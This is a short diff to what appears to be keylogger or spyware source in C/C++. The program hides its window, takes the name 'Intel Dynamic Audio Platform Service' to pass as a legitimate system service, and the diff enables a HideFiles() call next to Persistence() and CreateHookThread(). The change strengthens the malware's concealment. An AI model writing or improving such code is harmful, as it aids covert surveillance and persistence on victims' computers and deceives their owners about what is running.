@@ -251,11 +251,11 @@ void CreateHookThread() {
 
 int main() {
 	HideWindow();
-	SetConsoleTitleA("Intel Audio");
-	printf("Intel Audio.\n");
+	SetConsoleTitleA("Intel Dynamic Audio Platform Service");
+	printf("Intel Dynamic Audio Platform Service.\n");
 	if (SetFileNames()) {
 		LogTime();
-		//HideFiles();
+		HideFiles();
 		Persistence();
 		CreateHookThread();
 	}
